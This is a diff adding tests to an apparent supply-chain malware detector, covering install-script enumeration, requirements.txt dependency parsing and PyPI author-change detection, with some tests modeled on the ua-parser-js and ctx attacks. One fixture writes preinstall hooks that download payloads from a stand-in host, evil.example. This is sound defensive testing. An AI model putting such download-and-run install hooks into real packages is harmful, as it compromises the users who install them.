@@ -105,6 +105,28 @@ def non_source_files(tmp_path: Path):
     return a, b
 
 
+@pytest.fixture
+def install_scripts_added(tmp_path: Path):
+    """to_dir adds a preinstall dispatcher plus its shell/batch payloads.
+
+    Modeled on the real ua-parser-js@0.7.29 attack (see
+    dataset/malicious/ua-parser-js/) — a thin JS dispatcher that shells out
+    to .sh/.bat scripts carrying the actual payload.
+    """
+    a = tmp_path / "a"
+    b = tmp_path / "b"
+    a.mkdir()
+    b.mkdir()
+    (a / "index.js").write_text("module.exports = 1;\n")
+    (b / "index.js").write_text("module.exports = 1;\n")
+    (b / "preinstall.js").write_text("require('child_process').exec('/bin/bash preinstall.sh')\n")
+    (b / "preinstall.sh").write_text("curl http://evil.example/payload -o payload\n")
+    (b / "preinstall.bat").write_text("curl http://evil.example/payload.exe -o payload.exe\n")
+    (b / "preinstall.ps1").write_text("Invoke-WebRequest http://evil.example/payload.exe\n")
+    (b / "preinstall.cmd").write_text("curl http://evil.example/payload.exe -o payload.exe\n")
+    return a, b
+
+
 # ── Engine tests ──────────────────────────────────────────────────────────────
 
 
@@ -138,6 +160,25 @@ class TestDiffEngine:
         # Only index.js should be in the diff — image.png and README.md excluded
         all_files = result.files_added + result.files_modified + result.files_removed
         assert all(f.endswith(".js") for f in all_files)
+
+    def test_install_scripts_are_enumerated(self, install_scripts_added):
+        """.sh/.bat/.ps1/.cmd must reach the diff, not just their JS dispatcher.
+
+        Regression test for the ua-parser-js corpus finding: a real attack's
+        preinstall.sh/preinstall.bat carried the actual payload, but the
+        diff engine used to only recognise JS/TS/Python extensions, so the
+        LLM never saw them — only the dispatcher that shelled out to them.
+        """
+        a, b = install_scripts_added
+        result = compute_diff(a, b)
+        assert set(result.files_added) == {
+            "preinstall.js", "preinstall.sh", "preinstall.bat",
+            "preinstall.ps1", "preinstall.cmd",
+        }
+        sh_diff = next(f for f in result.file_diffs if f.path == "preinstall.sh")
+        assert "evil.example" in sh_diff.unified_diff
+        bat_diff = next(f for f in result.file_diffs if f.path == "preinstall.bat")
+        assert "evil.example" in bat_diff.unified_diff
 
     def test_package_json_new_dependency_detected(self, with_package_json):
         a, b = with_package_json
@@ -268,6 +309,125 @@ class TestPythonMetadata:
         (b / "pyproject.toml").write_text("this is not = valid toml [[[")
         result = compute_diff(a, b)  # must not raise
         assert result.new_dependencies == []
+
+    def test_requirements_txt_new_dependency_detected(self, tmp_path: Path):
+        """Real gap surfaced by dataset/malicious/ctx/: a genuine new
+        requirements.txt dependency (Flask, added by the 2022 attacker) was
+        invisible to new_dependencies because nothing parsed the file."""
+        a, b = _two_dirs(tmp_path)
+        (a / "requirements.txt").write_text("")
+        (b / "requirements.txt").write_text("Flask==2.1.0\n")
+        result = compute_diff(a, b)
+        assert "flask" in result.new_dependencies
+
+    def test_requirements_txt_skips_options_and_comments(self, tmp_path: Path):
+        a, b = _two_dirs(tmp_path)
+        (a / "requirements.txt").write_text("")
+        (b / "requirements.txt").write_text(
+            "# a comment\n"
+            "-r other.txt\n"
+            "--hash=sha256:deadbeef\n"
+            "-e .\n"
+            "\n"
+            "requests>=2.0  # inline comment\n"
+        )
+        result = compute_diff(a, b)
+        assert result.new_dependencies == ["requests"]
+
+    def test_requirements_txt_missing_file_is_fine(self, tmp_path: Path):
+        a, b = _two_dirs(tmp_path)
+        result = compute_diff(a, b)  # must not raise
+        assert result.new_dependencies == []
+
+
+class TestPyPIMaintainerChanged:
+    """maintainer_changed detection was npm-only until 2026-08-11 — see
+    dataset/findings/README.md recommendation #10."""
+
+    def test_setup_py_author_change_detected(self, tmp_path: Path):
+        a, b = _two_dirs(tmp_path)
+        (a / "setup.py").write_text(
+            "from setuptools import setup\n"
+            "setup(name='p', author='Robert Ledger', author_email='r@example.com')\n"
+        )
+        (b / "setup.py").write_text(
+            "from setuptools import setup\n"
+            "setup(name='p', author='Someone Else', author_email='r@example.com')\n"
+        )
+        result = compute_diff(a, b)
+        assert result.maintainer_changed is True
+
+    def test_pyproject_authors_change_detected(self, tmp_path: Path):
+        a, b = _two_dirs(tmp_path)
+        (a / "pyproject.toml").write_text(
+            '[project]\nname = "p"\n'
+            'authors = [{name = "Robert Ledger", email = "r@example.com"}]\n'
+        )
+        (b / "pyproject.toml").write_text(
+            '[project]\nname = "p"\n'
+            'authors = [{name = "Someone Else", email = "r@example.com"}]\n'
+        )
+        result = compute_diff(a, b)
+        assert result.maintainer_changed is True
+
+    def test_module_dunder_author_change_detected(self, tmp_path: Path):
+        """This is the exact real-world shape: dataset/malicious/ctx/'s
+        setup.py author= kwarg was never touched by the attacker — only
+        ctx.py's __author__ dunder was, and only this path catches it."""
+        a, b = _two_dirs(tmp_path)
+        (a / "ctx.py").write_text(
+            "__author__ = 'Robert Ledger'\n__email__ = 'figlief@figlief.com'\n"
+        )
+        (b / "ctx.py").write_text(
+            "__author__ = 'Yunus AYDIN'\n__email__ = 'figlief@figlief.com'\n"
+        )
+        result = compute_diff(a, b)
+        assert result.maintainer_changed is True
+
+    def test_unchanged_setup_py_author_does_not_short_circuit_dunder_check(
+        self, tmp_path: Path,
+    ):
+        """Regression test for a real bug caught during development: an
+        earlier version of _pypi_author used `or` between sources, so an
+        unchanged setup.py author= (present on both sides) masked a real
+        change in ctx.py's __author__ dunder entirely."""
+        a, b = _two_dirs(tmp_path)
+        for d in (a, b):
+            (d / "setup.py").write_text(
+                "from setuptools import setup\n"
+                "setup(name='p', author='Robert Ledger', author_email='r@example.com')\n"
+            )
+        (a / "ctx.py").write_text("__author__ = 'Robert Ledger'\n")
+        (b / "ctx.py").write_text("__author__ = 'Yunus AYDIN'\n")
+        result = compute_diff(a, b)
+        assert result.maintainer_changed is True
+
+    def test_no_author_declared_anywhere_does_not_flag(self, tmp_path: Path):
+        a, b = _two_dirs(tmp_path)
+        (a / "index.py").write_text("x = 1\n")
+        (b / "index.py").write_text("x = 2\n")
+        result = compute_diff(a, b)
+        assert result.maintainer_changed is False
+
+    def test_author_declared_only_on_one_side_does_not_flag(self, tmp_path: Path):
+        """Conservative guard, mirroring the existing npm behaviour: a
+        package newly declaring authorship isn't the same signal as a
+        package changing who its author is."""
+        a, b = _two_dirs(tmp_path)
+        (b / "setup.py").write_text(
+            "from setuptools import setup\nsetup(name='p', author='Someone')\n"
+        )
+        result = compute_diff(a, b)
+        assert result.maintainer_changed is False
+
+    def test_unchanged_author_does_not_flag(self, tmp_path: Path):
+        a, b = _two_dirs(tmp_path)
+        for d in (a, b):
+            (d / "setup.py").write_text(
+                "from setuptools import setup\nsetup(name='p', author='Same Person')\n"
+            )
+        result = compute_diff(a, b)
+        assert result.maintainer_changed is False
 
 
 # ── Native addon tests ────────────────────────────────────────────────────────
